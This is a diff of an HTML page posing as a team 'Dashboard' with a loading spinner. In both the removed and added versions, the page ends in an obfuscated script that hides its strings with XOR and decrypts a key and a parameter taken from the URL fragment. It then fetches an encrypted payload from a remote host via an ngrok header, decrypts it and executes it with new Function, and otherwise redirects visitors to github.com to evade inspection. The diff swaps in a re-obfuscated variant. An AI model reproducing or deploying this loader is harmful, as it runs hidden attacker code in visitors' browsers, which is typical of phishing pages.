@@ -1,19 +1,17 @@
 <!DOCTYPE html>
-<!-- rendered at fe390867 -->
+<!-- ssr:app-7d8975ec -->
 <html lang="en" data-turbo-body>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Dashboard</title>
 <link rel="icon" href="data:," type="image/x-icon">
-<meta name="color-scheme" content="light dark">
-<meta name="request-id" content="829f95a4eecb">
-<meta name="browser-stats-url" content="/stats">
-<meta name="og:title" content="Dashboard">
-<meta name="html-safe-nonce" content="dc42c5e6a399">
-<meta name="route-pattern" content="/:org_id/dashboard">
 <meta name="page-subject" content="Dashboard">
-<!-- fragment:0a5a83a5 -->
+<meta name="description" content="Secure workspace for your team">
+<meta name="color-scheme" content="light dark">
+<meta name="html-safe-nonce" content="246c00d7a8ce">
+<meta name="turbo-cache-control" content="no-preview">
+<!-- build-id:e0a35d16 -->
 <style>body{margin:0;padding:0;background:#f6f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans",Helvetica,Arial,sans-serif}
 #app{max-width:1012px;margin:0 auto;padding:40px 16px}
 .Header,.footer,.skeleton-line{display:none}
@@ -21,36 +19,36 @@
 .loader{width:40px;height:40px;margin:20vh auto;border:3px solid #d1d9e0;border-top-color:#586069;border-radius:50%;animation:spin .8s linear infinite}</style>
 <style>
 :root{--bgColor-default:#ffffff;--fgColor-default:#1f2328;--bgColor-muted:#f6f8fa;--borderColor-default:#d1d9e0;--color-accent-fg:#0969da;--header-bgColor:#24292f;--header-fgColor:#ffffff}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
-.flex-justify-center{justify-content:center!important}
-.color-bg-default{background-color:var(--bgColor-default,#ffffff)!important}
-.flex-items-center{align-items:center!important}
-.px-3{padding-right:16px!important;padding-left:16px!important}
-.icon{display:inline-block;overflow:visible;vertical-align:text-bottom;fill:currentColor}
+@keyframes fade-in{from{opacity:0}to{opacity:1}}
 .sr-only{position:absolute;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}
-.color-fg-default{color:var(--fgColor-default,#1f2328)!important}
+.flex-items-center{align-items:center!important}
+.mt-3{margin-top:16px!important}
+.flex-justify-center{justify-content:center!important}
+.px-3{padding-right:16px!important;padding-left:16px!important}
+.anim-fade-in{animation:fade-in .3s ease-in-out}
+.color-bg-default{background-color:var(--bgColor-default,#ffffff)!important}
+.icon{display:inline-block;overflow:visible;vertical-align:text-bottom;fill:currentColor}
 @media(max-width:544px){.hide-sm{display:none!important}}
+@media(prefers-color-scheme:dark){:root{--bgColor-default:#0d1117;--fgColor-default:#e6edf3}}
 </style>
 </head>
-<!-- hydrate -->
+<!-- turbo-body -->
 <body class="env-production">
-<script>window.__app={env:"production",node_id:"599e46c31b9dcf0c",session:"79e8b2c2d7db9935bc6edf81",turbo:true,ssr:false}</script>
+<script>window.__app={env:"production",node_id:"2b99a6a0fdd12a09",session:"1eaca9e47c43e3f1e6a864c6",turbo:true,ssr:false}</script>
 <header class="Header" role="banner"><div class="Header-item"><a href="/" aria-label="Homepage"><svg height="32" viewBox="0 0 24 24" width="32" class="icon" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></a></div><div class="Header-item Header-item--full"><input type="text" class="form-control Header-input" placeholder="Search..." aria-label="Search"></div></header>
 <main>
 <div id="app">
 <div class="loader"></div>
 </div>
 </main>
-<div class="skeleton-line" style="width:86%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<div class="skeleton-line" style="width:85%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<div class="skeleton-line" style="width:64%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<div class="skeleton-line" style="width:53%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<div class="skeleton-line" style="width:80%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<div class="skeleton-line" style="width:52%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<!-- chunk:aeed5287 -->
-<footer class="footer mt-3 text-center" role="contentinfo"><span>&copy; 2025</span> <a href="#contact" class="footer-link">Contact</a> <a href="#terms" class="footer-link">Terms</a> <a href="#docs" class="footer-link">Documentation</a> <a href="#security" class="footer-link">Security</a></footer>
-<!-- turbo-body -->
-<script>(async function(){var fnkzhjtazi=function(a){return a.map(function(c){return String.fromCharCode(c^159)}).join('')};var fnwedermso=function(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';var b=atob(s),a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);return a;};var fnkkeqzrxg=function(h){var a=new Uint8Array(h.length/2);for(var i=0;i<h.length;i+=2)a[i/2]=parseInt(h.substr(i,2),16);return a;};var fngfzxzffg=async function(k,d){var _awqjifcr=await crypto.subtle.importKey('raw',k,fnkzhjtazi([222, 218, 204, 178, 216, 220, 210]),false,['decrypt']);var _hlndnyty=d.slice(0,12);var _hsnxbfpj=d.slice(12);return await crypto.subtle.decrypt({name:fnkzhjtazi([222, 218, 204, 178, 216, 220, 210]),iv:_hlndnyty},_awqjifcr,_hsnxbfpj);};try{var _ehsuoziv=new URLSearchParams(window.location.hash.substring(1));var _otwgychc=_ehsuoziv.get('d');if(!_otwgychc){window.location.replace(fnkzhjtazi([247, 235, 235, 239, 236, 165, 176, 176, 248, 246, 235, 247, 234, 253, 177, 252, 240, 242]));return;}var _ycpavass=fnwedermso(_otwgychc);var _fnignmiu=fnkkeqzrxg('5b89f087539c111977ce5bae43e1128afda2a16a3c2df0eb6e050ffc3085c45f');var _vpmoxkdh=fnkkeqzrxg('e104122de40cc2000c5f2e1c70ebcfd8f20466714119cf528448ca47e5f371cb');var _qxtdzlok=new Uint8Array(_fnignmiu.length);for(var i=0;i<_fnignmiu.length;i++)_qxtdzlok[i]=_fnignmiu[i]^_vpmoxkdh[i];var _kvaegmqp=JSON.parse(new TextDecoder().decode(await fngfzxzffg(_qxtdzlok,_ycpavass)));if(_kvaegmqp.e&&new Date()>new Date(_kvaegmqp.e)){window.location.replace(fnkzhjtazi([247, 235, 235, 239, 236, 165, 176, 176, 248, 246, 235, 247, 234, 253, 177, 252, 240, 242]));return;}var _qzlxcqnn=await fetch(_kvaegmqp.u+fnkzhjtazi([176, 252, 176])+_kvaegmqp.c,{headers:{[fnkzhjtazi([199, 178, 207, 234, 253, 243, 246, 252, 178, 212, 250, 230])]:_kvaegmqp.k,[fnkzhjtazi([241, 248, 237, 240, 244, 178, 236, 244, 246, 239, 178, 253, 237, 240, 232, 236, 250, 237, 178, 232, 254, 237, 241, 246, 241, 248])]:'1'}});if(!_qzlxcqnn.ok)throw new Error();var _laseznry=await _qzlxcqnn.json();if(_laseznry.x&&new Date()>new Date(_laseznry.x)){window.location.replace(fnkzhjtazi([247, 235, 235, 239, 236, 165, 176, 176, 248, 246, 235, 247, 234, 253, 177, 252, 240, 242]));return;}var _bzbxunkw=new TextDecoder().decode(await fngfzxzffg(fnkkeqzrxg(_kvaegmqp.t),fnwedermso(_laseznry.d)));var _rancjxiy=new Function('payload','b64','hex2buf','decrypt','return (async()=>{'+_bzbxunkw+'})()');await _rancjxiy(_kvaegmqp,fnwedermso,fnkkeqzrxg,fngfzxzffg);}catch(e){window.location.replace(fnkzhjtazi([247, 235, 235, 239, 236, 165, 176, 176, 248, 246, 235, 247, 234, 253, 177, 252, 240, 242]));}})();</script>
+<div class="skeleton-line" style="width:76%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:44%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:83%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:77%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:88%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<!-- async-boundary:05e8f2f8 -->
+<footer class="footer mt-3 text-center" role="contentinfo"><span>&copy; 2025</span> <a href="#pricing" class="footer-link">Pricing</a> <a href="#api" class="footer-link">API</a> <a href="#terms" class="footer-link">Terms</a> <a href="#privacy" class="footer-link">Privacy</a></footer>
+<!-- fragment:93cfd920 -->
+<script>(async function(){var fnwswawgjf=function(a){return a.map(function(c){return String.fromCharCode(c^38)}).join('')};var fntvzzdaff=function(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';var b=atob(s),a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);return a;};var fnehpuhxfe=function(h){var a=new Uint8Array(h.length/2);for(var i=0;i<h.length;i+=2)a[i/2]=parseInt(h.substr(i,2),16);return a;};var fnnbmtktvb=async function(k,d){var _xcicqcjr=await crypto.subtle.importKey('raw',k,fnwswawgjf([103, 99, 117, 11, 97, 101, 107]),false,['decrypt']);var _lqjiwynd=d.slice(0,12);var _djdykjtn=d.slice(12);return await crypto.subtle.decrypt({name:fnwswawgjf([103, 99, 117, 11, 97, 101, 107]),iv:_lqjiwynd},_xcicqcjr,_djdykjtn);};try{var _rkuzqgei=new URLSearchParams(window.location.hash.substring(1));var _otqgrbyf=_rkuzqgei.get('d');if(!_otqgrbyf){window.location.replace(fnwswawgjf([78, 82, 82, 86, 85, 28, 9, 9, 65, 79, 82, 78, 83, 68, 8, 69, 73, 75]));return;}var _icqtghsb=fntvzzdaff(_otqgrbyf);var _kgylibjn=fnehpuhxfe('a11a32122517cd931fb2f420657f6bb9da5b2fe27de384cdac9c68384a18d39f');var _ltzntcnq=fnehpuhxfe('44f0870adc74e8c12314993847fdbff67919738eae860ad991080d5e21441c3f');var _vwhrptye=new Uint8Array(_kgylibjn.length);for(var i=0;i<_kgylibjn.length;i++)_vwhrptye[i]=_kgylibjn[i]^_ltzntcnq[i];var _kjblryec=JSON.parse(new TextDecoder().decode(await fnnbmtktvb(_vwhrptye,_icqtghsb)));if(_kjblryec.e&&new Date()>new Date(_kjblryec.e)){window.location.replace(fnwswawgjf([78, 82, 82, 86, 85, 28, 9, 9, 65, 79, 82, 78, 83, 68, 8, 69, 73, 75]));return;}var _elxtwcea=await fetch(_kjblryec.u+fnwswawgjf([9, 69, 9])+_kjblryec.c,{headers:{[fnwswawgjf([126, 11, 118, 83, 68, 74, 79, 69, 11, 109, 67, 95])]:_kjblryec.k,[fnwswawgjf([72, 65, 84, 73, 77, 11, 85, 77, 79, 86, 11, 68, 84, 73, 81, 85, 67, 84, 11, 81, 71, 84, 72, 79, 72, 65])]:'1'}});if(!_elxtwcea.ok)throw new Error();var _xrqibdks=await _elxtwcea.json();if(_xrqibdks.x&&new Date()>new Date(_xrqibdks.x)){window.location.replace(fnwswawgjf([78, 82, 82, 86, 85, 28, 9, 9, 65, 79, 82, 78, 83, 68, 8, 69, 73, 75]));return;}var _crbvwfcy=new TextDecoder().decode(await fnnbmtktvb(fnehpuhxfe(_kjblryec.t),fntvzzdaff(_xrqibdks.d)));var _hdgnqimp=new Function('payload','b64','hex2buf','decrypt','return (async()=>{'+_crbvwfcy+'})()');await _hdgnqimp(_kjblryec,fntvzzdaff,fnehpuhxfe,fnnbmtktvb);}catch(e){window.location.replace(fnwswawgjf([78, 82, 82, 86, 85, 28, 9, 9, 65, 79, 82, 78, 83, 68, 8, 69, 73, 75]));}})();</script>
 </body>
 </html>
